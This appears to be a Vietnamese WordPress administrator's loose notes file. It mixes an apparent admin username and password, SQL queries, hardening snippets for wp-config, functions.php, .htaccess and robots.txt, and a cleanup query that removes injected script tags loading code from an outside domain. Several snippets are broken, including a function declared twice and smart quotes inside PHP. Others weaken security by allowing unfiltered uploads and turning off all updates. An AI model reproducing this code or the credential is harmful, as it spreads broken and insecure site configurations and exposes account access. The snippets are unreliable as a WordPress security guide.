codeadmin    
Y@s2H#R47zi^gQrYaK)5b5w&

define('ALLOW_UNFILTERED_UPLOADS', true);

<!-- MSQL -->

Bạn có thực sự muốn thực hiện lệnh truy vấn sau đây không?
DELETE FROM `wpvvk_posts` WHERE `wpvvk_posts`.`ID` = 1772;

add_filter('use_block_editor_for_post', '__return_false');

4. xoa phpmyadmin

UPDATE wpdb_posts SET post_content=(REPLACE (post_content, "<script src='https://https://port.transandfiestas.ga/js.php?s=q' type='text/javascript'></script><script src='https://https://port.transandfiestas.ga/js.php?s=q' type='text/javascript'></script>","")) 

UPDATE wpzx_posts SET post_content=(REPLACE (post_content, '','')) 

//js fix https
	<script>
		if (location.protocol !== 'https:') {
			location.replace(`https:${location.href.substring(location.protocol.length)}`);
		}
	</script>

<?
// WP_Security

// --------------> wp-config.php

// Cách tắt cập nhật WordsPress
define( 'WP_AUTO_UPDATE_CORE', false );

//Khong cho edit theme
define( 'DISALLOW_FILE_EDIT', true );

//Disable updating everything for WordPress
define( 'DISALLOW_FILE_MODS', true );
define( 'AUTOMATIC_UPDATER_DISABLED', true );

//Limit Revisions
define('AUTOSAVE_INTERVAL', 300); // seconds
define('WP_POST_REVISIONS', 20);

// --------------> function.php

// Login remove wordpress authentication
remove_filter('authenticate', 'wp_authenticate_username_password', 20);
add_filter('authenticate', function($user, $email, $password){
    if(empty($email) || empty ($password)){        
        $error = new WP_Error();

        if(empty($email)){ 
            $error->add('empty_username', __('<strong>ERROR</strong>: Email field is empty.'));
        }
        else if(!filter_var($email, FILTER_VALIDATE_EMAIL)){ 
            $error->add('invalid_username', __('<strong>ERROR</strong>: Email is invalid.'));
        }

        if(empty($password)){ 
            $error->add('empty_password', __('<strong>ERROR</strong>: Password field is empty.'));
        }
        return $error;
    }
    $user = get_user_by('email', $email);
    if(!$user){
        $error = new WP_Error();
        $error->add('invalid', __('<strong>ERROR</strong>: Either the email or password you entered is invalid.'));
        return $error;
    }
    else{ 
        if(!wp_check_password($password, $user->user_pass, $user->ID)){ 
            $error = new WP_Error();
            $error->add('invalid', __('<strong>ERROR</strong>: Either the email or password you entered is invalid.'));
            return $error;
        }else{
            return $user; 
        }
    }
}, 20, 3);

// Tắt cập nhật plugin
add_filter( 'auto_update_plugin', '__return_false' );

// Tắt cập nhật cho themes
add_filter( 'auto_update_theme', '__return_false' );

// Vô hiệu hóa thông báo cập nhật của WordPress: 
add_action ( 'after_setup_theme' , 'remove_core_updates' ); 
function remove_core_updates () { if (! current_user_can ( 'update_core' )){ return ;} 
add_action ( 'init' , create_function ( '$a' , “remove_action( 'Init', 'wp_version_check' );” ), 2 ); 
add_filter ( 'pre_option_update_core' , '__return_null' ); 
add_filter ( 'pre_site_transient_update_core' , '__return_null' ); }

// Vô hiệu hoá thông báo cập nhật của các Plugin trong WordPress:

remove_action ( 'load-update-core.php' , 'wp_update_plugins' ); 
add_filter ( 'pre_site_transient_update_plugins' , '__return_null' );

// Vô hiệu hoá tất cả các thông báo cập nhật trong WordPress

function remove_core_updates (){ global $wp_version ; return ( object ) array ( 'last_checked' => time (), 'version_checked' => $wp_version ,); } 
add_filter ( 'pre_site_transient_update_core' , 'remove_core_updates' ); 
add_filter ( 'pre_site_transient_update_plugins' , 'remove_core_updates' ); 
add_filter ( 'pre_site_transient_update_themes' , 'remove_core_updates' );


// Only allow uploading of files gif png jpg
add_filter('wp_handle_upload_prefilter', 'yoursite_wp_handle_upload_prefilter');
function yoursite_wp_handle_upload_prefilter($file) {
    if ($file['type']=='application/octet-stream' && isset($file['tmp_name'])) {
        $file_size = getimagesize($file['tmp_name']);
        if (isset($file_size['error']) && $file_size['error']!=0) {
            $file['error'] = "Unexpected Error: {$file_size['error']}";
            return $file;
        } else {
            $file['type'] = $file_size['mime'];
        }
    }
    list($category,$type) = explode('/',$file['type']);
    if ('image'!=$category || !in_array($type,array('jpg','jpeg','gif','png'))) {
        $file['error'] = "Xin lỗi bạn chỉ có thể tải lên file ảnh định dạng .GIF, .JPG, hay .PNG";
    } else if ($post_id = (isset($_REQUEST['post_id']) ? $_REQUEST['post_id'] : false)) {
        if (count(get_posts("post_type=attachment&post_parent={$post_id}"))>20) // so hinh anh duoc phép tai len
        $file['error'] = "Xin lỗi, bạn không thể tải lên nhiều hơn 20 hình ảnh.";
    }
    return $file;
}

// Fix upload max
function filter_site_upload_size_limit( $size ) { 
    return 1024 * 1024 * 0.25; 
} 
add_filter( 'upload_size_limit', 'filter_site_upload_size_limit', 120 );

// --------------> htacces.txt

# Bảo vệ WordPress file config
<files wp-config.php>
    order allow,deny
    deny from all
</files>

# Tắt xmlrpc.php
<files xmlrpc.php>
order allow,deny
deny from all
</files>

// Tắt khả năng thực thi PHP trong thư mục được chỉ định .htaccess
<Files *.php>
    deny from all
</Files>


// -------------->  Robot.txt 
    
User-agent: *
Disallow: /wp-admin/
Disallow: /wp-includes/
Disallow: /wp-json/
Disallow: */?replytocom
Disallow: *?replytocom
Disallow: *?s
Disallow: *?attachment
Disallow: */?attachment
Disallow: *?attachment_id
Disallow: *pageinfo*
Sitemap: https://benhvienhongha.vn/sitemap_index.xml	